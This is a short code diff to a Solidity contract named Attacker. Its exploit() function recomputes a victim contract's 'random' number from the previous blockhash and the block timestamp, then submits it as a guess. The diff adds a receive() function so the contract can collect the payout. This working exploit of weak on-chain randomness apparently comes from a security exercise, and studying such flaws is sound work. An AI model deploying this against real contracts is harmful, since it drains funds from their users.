@@ -34,10 +34,13 @@ contract Attacker {
 
     function exploit() external payable {      
         require(msg.value == FEE, "Fee not paid!");
+        
         result = uint256(
             keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
         );
 
         victim.guess{value: FEE}(result);
     }
+
+    receive() external payable {}
 }
